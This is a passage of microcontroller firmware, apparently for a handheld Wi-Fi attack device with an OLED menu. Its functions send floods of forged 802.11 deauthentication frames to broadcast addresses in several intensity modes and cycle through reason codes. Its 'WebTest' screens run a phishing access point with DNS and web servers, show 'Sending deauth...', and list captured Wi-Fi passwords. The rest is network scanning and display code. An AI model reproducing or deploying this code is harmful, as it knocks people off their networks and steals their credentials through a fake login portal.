        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
      }
    }
  }
}

// 
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurst(const uint8_t* bssid,
                                       uint16_t reason,
                                       int framesToSend,
                                       int &packetCount,
                                       int interFrameDelayMs) {
  DeauthFrame frame;
  // memcpy
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayMs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delay(interFrameDelayMs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// （）
inline __attribute__((always_inline)) void sendFixedReasonDeauthBurstUs(const uint8_t* bssid,
                                        uint16_t reason,
                                        int framesToSend,
                                        int &packetCount,
                                        unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  frame.reason = reason;
  if (interFrameDelayUs > 0) {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      delayMicroseconds(interFrameDelayUs);
    }
  } else {
    for (int i = 0; i < framesToSend; i++) {
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// BSSID（DEAUTH_REASONS）burst（）
inline __attribute__((always_inline)) void sendDeauthBurstToBssidUs(const uint8_t* bssid,
                                     int burstTimes,
                                     int &packetCount,
                                     unsigned int interFrameDelayUs) {
  DeauthFrame frame;
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  for (int burst = 0; burst < burstTimes; burst++) {
    for (size_t r = 0; r < reasonCount; r++) {
      frame.reason = DEAUTH_REASONS[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
      if (interFrameDelayUs > 0) delayMicroseconds(interFrameDelayUs);
    }
  }
}

// ============ ============
// 
bool g_enhancedDeauthMode = true; // 

// ：，memcpy
inline void sendDeauthBatch(const uint8_t* bssid, int batchSize, int &packetCount) {
  static DeauthFrame frames[3]; // 3
  static bool initialized = false;
  static uint8_t lastBssid[6] = {0};
  
  // （BSSID）
  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i].source, bssid, 6);
      memcpy(frames[i].access_point, bssid, 6);
      memcpy(frames[i].destination, BROADCAST_MAC, 6);
      frames[i].reason = DEAUTH_REASONS[i];
    }
    memcpy(lastBssid, bssid, 6);
    initialized = true;
  }
  
  // 
  for (int batch = 0; batch < batchSize; batch++) {
    for (int i = 0; i < 3; i++) {
      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// ：，
inline void sendDeauthBatchEnhanced(const uint8_t* bssid, int batchSize, int &packetCount) {
  static DeauthFrame frames[6]; // 6：3 x 2
  static bool initialized = false;
  static uint8_t lastBssid[6] = {0};
  
  // （BSSID）
  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
    // AP -> Client （）
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i].source, bssid, 6);
      memcpy(frames[i].access_point, bssid, 6);
      memcpy(frames[i].destination, BROADCAST_MAC, 6);
      frames[i].reason = DEAUTH_REASONS[i];
    }
    // Client -> AP （）
    for (int i = 0; i < 3; i++) {
      memcpy(frames[i+3].source, BROADCAST_MAC, 6);
      memcpy(frames[i+3].access_point, bssid, 6);
      memcpy(frames[i+3].destination, bssid, 6);
      frames[i+3].reason = DEAUTH_REASONS[i];
    }
    memcpy(lastBssid, bssid, 6);
    initialized = true;
  }
  
  // ：
  for (int batch = 0; batch < batchSize; batch++) {
    // ，
    for (int i = 0; i < 6; i++) {
      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// 
inline void sendDeauthBurstIntensive(const uint8_t* bssid, int burstCount, int &packetCount) {
  DeauthFrame frame;
  const uint16_t intensiveReasons[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16}; // 10
  
  for (int burst = 0; burst < burstCount; burst++) {
    // AP -> Broadcast
    for (int r = 0; r < 10; r++) {
      memcpy(frame.source, bssid, 6);
      memcpy(frame.access_point, bssid, 6);
      memcpy(frame.destination, BROADCAST_MAC, 6);
      frame.reason = intensiveReasons[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
    // Broadcast -> AP
    for (int r = 0; r < 10; r++) {
      memcpy(frame.source, BROADCAST_MAC, 6);
      memcpy(frame.access_point, bssid, 6);
      memcpy(frame.destination, bssid, 6);
      frame.reason = intensiveReasons[r];
      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
      packetCount++;
    }
  }
}

// （）
inline void setChannelOptimized(int channel) {
  if (!g_deauthState.channelSet || g_deauthState.lastChannel != channel) {
    wext_set_channel(WLAN0_NAME, channel);
    g_deauthState.lastChannel = channel;
    g_deauthState.channelSet = true;
  }
}

// 
void stopAttack() {
  g_deauthState.running = false;
  g_deauthState.mode = ATTACK_IDLE;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // LED
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  
  Serial.println("=== Attack Stopped ===");
}
// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security_type = record->security;  // 
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  } else {
    // 
    g_scanDone = true;
  }
  return RTW_SUCCESS;
}
// selectedmenu()

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks...");
  scan_results.clear();
  SelectedVector.clear(); // WiFi
  g_scanDone = false;
  unsigned long startMs = millis();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    const unsigned long SCAN_TIMEOUT_MS = 2500; // 2.5
    while (!g_scanDone && (millis() - startMs) < SCAN_TIMEOUT_MS) {
      delay(10);
    }
    DEBUG_SER_PRINT(" Done!\n");
    // ，
    selectedFlags.assign(scan_results.size(), 0);
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

// UI：+SSID
static void performScanWithUI(const char* title, unsigned long timeoutMs, int maxResults) {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    int titleW = u8g2_for_adafruit_gfx.getUTF8Width(title);
    int titleX = (display.width() - titleW) / 2;
    u8g2_for_adafruit_gfx.setCursor(titleX, 24);
    u8g2_for_adafruit_gfx.print(title);
    display.display();

    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;
    unsigned long startMs = millis();
    // ："_-_-_-_-_" & "-_-_-_-_-"
    const char* frames[2] = {"_-_-_-_-_", "-_-_-_-_-"};
    int frameIndex = 0;
    const unsigned long animIntervalMs = 200;
    unsigned long lastAnimMs = 0;
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      while (!g_scanDone && (millis() - startMs) < timeoutMs) {
        unsigned long nowMs = millis();
        if (nowMs - lastAnimMs >= animIntervalMs) {
          lastAnimMs = nowMs;
          display.clearDisplay();
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          int tW = u8g2_for_adafruit_gfx.getUTF8Width(title);
          int tX = (display.width() - tW) / 2;
          u8g2_for_adafruit_gfx.setCursor(tX, 24);
          u8g2_for_adafruit_gfx.print(title);
          const char* animText = frames[frameIndex & 1];
          int aW = u8g2_for_adafruit_gfx.getUTF8Width(animText);
          int aX = (display.width() - aW) / 2;
          if (aX < 0) aX = 0;
          u8g2_for_adafruit_gfx.setCursor(aX, 48);
          u8g2_for_adafruit_gfx.print(animText);
          display.display();
          frameIndex++;
        }
        delay(10);
      }
      if (maxResults > 0 && scan_results.size() > (size_t)maxResults) {
        scan_results.resize(maxResults);
      }
      selectedFlags.assign(scan_results.size(), 0);
    } else {
      Serial.println("Scan fail, waiting");
      while (true) delay(1000);
    }

    Serial.println("Scan done");
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("Done");
    display.display();
    delay(300);
    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    // g_homeBaseStartIndex ，
    break;
  }
}

// contains()/addValue()
//uint8_t becaon_bssid[6];
inline bool isIndexSelected(int index) {
  return index >= 0 && (size_t)index < selectedFlags.size() && selectedFlags[(size_t)index] != 0;
}

void toggleSelection(int index) {
  bool found = false;
  int foundIndex = -1;
  
  // 
  for(size_t i = 0; i < SelectedVector.size(); i++) {
    if(SelectedVector[i] == index) {
      found = true;
      foundIndex = i;
      break;
    }
  }
  
  // 
  if(found) {
    // 
    SelectedVector.erase(SelectedVector.begin() + foundIndex);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 0;
  } else {
    // 
    SelectedVector.push_back(index);
    if (selectedFlags.size() != scan_results.size()) selectedFlags.assign(scan_results.size(), 0);
    if ((size_t)index < selectedFlags.size()) selectedFlags[(size_t)index] = 1;
  }
}

// 
bool containsChinese(const String& str) {
  for (size_t i = 0; i < (size_t)str.length(); i++) {
    if ((unsigned char)str[i] > 0x7F) {
      return true;
    }
  }
  return false;
}

String utf8TruncateToWidth(const String& input, int maxPixelWidth) {
  String out = input;
  if (u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) <= maxPixelWidth) return out;
  int ellipsisWidth = u8g2_for_adafruit_gfx.getUTF8Width("...");
  // Trim until text + ellipsis fits
  while (out.length() > 0 && (u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) + ellipsisWidth) > maxPixelWidth) {
    out.remove(out.length() - 1);
    // ensure we don't cut in the middle of a UTF-8 multibyte char
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  if (out.length() == 0) return String("...");
  return out + "...";
}

// （）
String utf8ClipToWidthNoEllipsis(const String& input, int maxPixelWidth) {
  if (u8g2_for_adafruit_gfx.getUTF8Width(input.c_str()) <= maxPixelWidth) return input;
  String out = input;
  while (out.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(out.c_str()) > maxPixelWidth) {
    out.remove(out.length() - 1);
    while (out.length() > 0) {
      uint8_t last = (uint8_t)out[out.length() - 1];
      if ((last & 0xC0) == 0x80) {
        out.remove(out.length() - 1);
      } else {
        break;
      }
    }
  }
  return out;
}

// UTF-8 （），
static inline int advanceUtf8Index(const String& s, int start) {
  int i = start + 1;
  int n = s.length();
  while (i < n) {
    uint8_t b = (uint8_t)s[i];
    if ((b & 0xC0) != 0x80) break; // ，
    i++;
  }
  return (i <= n) ? i : n;
}

// ===== UI Helpers: rounded highlight, chevron =====
void drawRightChevron(int y, int lineHeight, bool isSelected) {
  int x = display.width() - UI_RIGHT_GUTTER - 8; // 
  int ymid = y + lineHeight / 2;
  int color = isSelected ? SSD1306_BLACK : SSD1306_WHITE;
  display.fillTriangle(x, ymid - 3, x, ymid + 3, x + 4, ymid, color);
}

void drawRoundedHighlight(int y, int height) {
  int width = display.width() - UI_RIGHT_GUTTER; // 
  int radius = 2; // 
  display.fillRoundRect(0, y, width, height, radius, SSD1306_WHITE);
}

// ===== OLED single-line helpers =====
// ，
static inline void oledDrawCenteredLine(const char* text, int baselineY) {
  display.fillRect(0, baselineY - 9, display.width(), 12, SSD1306_BLACK);
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  int w = u8g2_for_adafruit_gfx.getUTF8Width(text);
  int x = (display.width() - w) / 2;
  if (x < 0) x = 0;
  u8g2_for_adafruit_gfx.setCursor(x, baselineY);
  u8g2_for_adafruit_gfx.print(text);
  display.display();
}

// ；true
static inline bool oledMaybeDrawCenteredLine(const char* text, int baselineY, unsigned long& lastDrawMs, unsigned long intervalMs) {
  unsigned long nowMs = millis();
  if (intervalMs == 0) return false; // 0 
  if (nowMs - lastDrawMs < intervalMs) return false;
  oledDrawCenteredLine(text, baselineY);
  lastDrawMs = nowMs;
  return true;
}

// 
void drawHomeScrollbar(int startIndex) {
  // ，
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = display.width() - UI_RIGHT_GUTTER + 1; // 
  int barWidth = UI_RIGHT_GUTTER - 2; // 1px
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  // （）
  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  // 
  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
  // 
  float posRatio = (float)startIndex / (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  // 
  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// ：
void drawHomeScrollbarFraction(float startIndexF) {
  if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;

  int barX = display.width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;

  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;

  float denom = (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
  if (posRatio < 0.0f) posRatio = 0.0f;
  if (posRatio > 1.0f) posRatio = 1.0f;
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);

  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// 

// ===== =====
// ：（） - ， drawHomeMenuBasePaged 
// void drawHomeMenuBase() {
// // drawHomeMenuBasePaged drawHomeMenuBasePaged_NoFlush 
// }

// ===== WebTest OLED Pages (defined after globals to fix forward references) =====
void drawWebTestMain() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  const char* line1_text = "↑ AP Info ↑";
  int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1_text);
  int x1_center = (display.width() - w1) / 2;
  u8g2_for_adafruit_gfx.setCursor(x1_center, 12);
  u8g2_for_adafruit_gfx.print(line1_text);
  
  
  // 
  u8g2_for_adafruit_gfx.setCursor(15, 28);
  u8g2_for_adafruit_gfx.print("Stop phishing");
  int left_arrow2_x = 5;
  int arrow2_y = 22;
  // 
  display.fillTriangle(left_arrow2_x + 4, arrow2_y - 3, left_arrow2_x + 4, arrow2_y + 3, left_arrow2_x - 2, arrow2_y, SSD1306_WHITE);
  
  // 
  const char* line3_text = "View passwords";
  int w3 = u8g2_for_adafruit_gfx.getUTF8Width(line3_text);
  int x3_right = display.width() - w3 - 15;
  u8g2_for_adafruit_gfx.setCursor(x3_right, 44);
  u8g2_for_adafruit_gfx.print(line3_text);
  int right_arrow3_x = display.width() - 5;
  int arrow3_y = 38;
  // 
  display.fillTriangle(right_arrow3_x - 4, arrow3_y - 3, right_arrow3_x - 4, arrow3_y + 3, right_arrow3_x + 2, arrow3_y, SSD1306_WHITE);
  // ""：
  // ：
  // - 
  // - ，（4）
  {
    bool should_draw_border = false;
    if (webtest_border_always_on) {
      should_draw_border = true;
    }
    if (webtest_flash_remaining_toggles > 0) {
      unsigned long now_ms = millis();
      // 150ms
      if (now_ms - webtest_last_flash_toggle_ms >= 150UL) {
        webtest_last_flash_toggle_ms = now_ms;
        webtest_border_flash_visible = !webtest_border_flash_visible;
        webtest_flash_remaining_toggles--;
      }
      // （，）
      should_draw_border = webtest_border_flash_visible;
    }
    if (should_draw_border) {
      int text_y_baseline = 44;
      int text_height = 10; // 
      int pad_x = 2;
      int pad_y = 2;
      int rect_x = x3_right - pad_x - 1;
      int rect_y = text_y_baseline - text_height - pad_y;
      int rect_w = w3 + pad_x * 2 + 2;
      int rect_h = text_height + pad_y * 2;
      int r = 3; // 
      display.drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
    }
  }
  
  // 
  const char* line4_text = "↓ Status ↓";
  int w4 = u8g2_for_adafruit_gfx.getUTF8Width(line4_text);
  int x4_center = (display.width() - w4) / 2;
  u8g2_for_adafruit_gfx.setCursor(x4_center, 60);
  u8g2_for_adafruit_gfx.print(line4_text);
  
  display.display();
}

void drawWebTestInfo() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  const char* title = "[AP Info]";
  int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
  int x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 12);
  u8g2_for_adafruit_gfx.print(title);
  String line2 = web_test_ssid_dynamic;
  w = u8g2_for_adafruit_gfx.getUTF8Width(line2.c_str());
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 28);
  u8g2_for_adafruit_gfx.print(line2);
  String band = (is24GChannel(web_test_channel_dynamic) ? "2.4" : (is5GChannel(web_test_channel_dynamic) ? "5G" : "?"));
  String line3 = String("Band: ") + band + String("|CH: ") + String(web_test_channel_dynamic);
  w = u8g2_for_adafruit_gfx.getUTF8Width(line3.c_str());
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 44);
  u8g2_for_adafruit_gfx.print(line3);
  const char* hint = "↓ Back ↓";
  w = u8g2_for_adafruit_gfx.getUTF8Width(hint);
  x = (display.width() - w) / 2;
  u8g2_for_adafruit_gfx.setCursor(x, 60);
  u8g2_for_adafruit_gfx.print(hint);
  display.display();
}

void drawWebTestPasswords() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 12);
  u8g2_for_adafruit_gfx.print("< Back");
  const char* title = "[Passwords]";
  int w = u8g2_for_adafruit_gfx.getUTF8Width(title);
  int x = display.width() - w - 2;
  u8g2_for_adafruit_gfx.setCursor(x, 12);
  u8g2_for_adafruit_gfx.print(title);
  const int startY = 28;
  const int lineH = 14;
  const int scrollbarWidth = 3; // 
  int y = startY;
  if (web_test_submitted_texts.empty()) {
    const char* emptyMsg = "No passwords yet";
    w = u8g2_for_adafruit_gfx.getUTF8Width(emptyMsg);
    x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 40);
    u8g2_for_adafruit_gfx.print(emptyMsg);
  } else {
    int totalItems = (int)web_test_submitted_texts.size();
    if (webtest_password_scroll < 0) webtest_password_scroll = 0;
    if (webtest_password_scroll > totalItems - 1) webtest_password_scroll = totalItems > 0 ? totalItems - 1 : 0;
    int usedLines = 0;
    for (int i = webtest_password_scroll; i < (int)web_test_submitted_texts.size() && usedLines < 3; i++) {
      String txt = web_test_submitted_texts[i];
      String remaining = txt;
      bool firstLineOfEntry = true;
      while (remaining.length() > 0 && usedLines < 3) {
        int widthAvail = display.width() - 6 - (scrollbarWidth + 1); // 1
        int tw = u8g2_for_adafruit_gfx.getUTF8Width(remaining.c_str());
        String seg = remaining;
        if (tw > widthAvail) {
          int approx = (remaining.length() * widthAvail) / tw;
          if (approx <= 0) approx = 1;
          seg = remaining.substring(0, approx);
          remaining = remaining.substring(approx);
        } else {
          remaining = "";
        }
        // ： "> "，
        String line = seg;
        if (firstLineOfEntry) {
          line = String("> ") + line;
          firstLineOfEntry = false;
        }
        u8g2_for_adafruit_gfx.setCursor(2, y);
        u8g2_for_adafruit_gfx.print(line);
        y += lineH;
        usedLines++;
      }
    }
    // （）
    // totalItems 
    if (totalItems > 1) {
      int trackX = display.width() - scrollbarWidth;
      int trackY = startY; // 
      int trackH = 3 * lineH; // 
      // 
      if (trackY + trackH > display.height()) {
        trackH = display.height() - trackY;
      }
      if (trackH < 6) trackH = 6; // 
      // （）
      display.drawLine(trackX, trackY, trackX, trackY + trackH - 1, SSD1306_WHITE);
      // 6px，
      int thumbH = (trackH * 1) / std::max(totalItems, 3); // 1
      if (thumbH < 6) thumbH = 6;
      if (thumbH > trackH) thumbH = trackH;
      float posRatio = (float)webtest_password_scroll / (float)(totalItems - 1);
      int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
      // （）
      display.fillRect(trackX, thumbY, scrollbarWidth, thumbH, SSD1306_WHITE);
    }
  }
  display.display();
}

void drawWebTestStatus() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  {
    const char* t = "↑ Back ↑";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(t);
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 12);
    u8g2_for_adafruit_gfx.print(t);
  }
  // bool apRunning = web_test_active; // unused
  String l2 = String("Sending deauth...");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l2.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 28);
    u8g2_for_adafruit_gfx.print(l2);
  }
  String l3 = String("Web: ") + (web_server_active ? "Running" : "Stopped");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l3.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 44);
    u8g2_for_adafruit_gfx.print(l3);
  }
  String l4 = String("DNSServer: ") + (dns_server_active ? "Running" : "Stopped");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l4.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 60);
    u8g2_for_adafruit_gfx.print(l4);
  }
  display.display();
}

// （）- 
static int g_homeBaseStartIndex = 0;
void drawHomeMenuBasePaged(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  // 
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; // 
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(g_homeMenuItems[menuIndex].label);
    // 
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  // 
  drawHomeScrollbar(startIndex);
  display.display();
}
// ：
void drawHomeMenuBasePaged_NoFlush(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  // 
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // 2px：+11+13
    
    // 
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  // （）
  drawHomeScrollbar(startIndex);
}
void drawHomeMenuBasePagedShim() { drawHomeMenuBasePaged_NoFlush(g_homeBaseStartIndex); }

// ：y（）。/，。
static inline void drawHomePageWithOffset_NoFlush(int startIndex, int yOffset) {
  display.setTextSize(1);
  // 
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
    int textY = rectY + 13; // 2px：+11+13
    // ，
    if (rectY > display.height() || rectY + HOME_RECT_HEIGHT < 0) continue;
    
    // 
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}

// ：fromStartIndextoStartIndex（1）
static inline void animateHomePageFlip(int fromStartIndex, int toStartIndex) {
  if (fromStartIndex == toStartIndex) return;
  int delta = toStartIndex - fromStartIndex;
  if (delta != 1 && delta != -1) {
    // 
    drawHomeMenuBasePaged(fromStartIndex);
    return;
  }
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  unsigned long nextStepDeadline = millis() + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
    int dir = (delta > 0) ? 1 : -1; // +1: ；-1: 
    int fromYOffset = (dir > 0) ? -offset : offset;
    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);

    display.clearDisplay();
    // （）
    if (dir > 0) {
      // ：，
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
    } else {
      // ：，
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
    }

    // 
    float progress = (float)offset / (float)HOME_ITEM_HEIGHT; // 0..1
    float startIndexF = (float)fromStartIndex + progress * (float)delta;
    drawHomeScrollbarFraction(startIndexF);

    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      display.display();
    }
    if (delayPerStepMs > 0) {
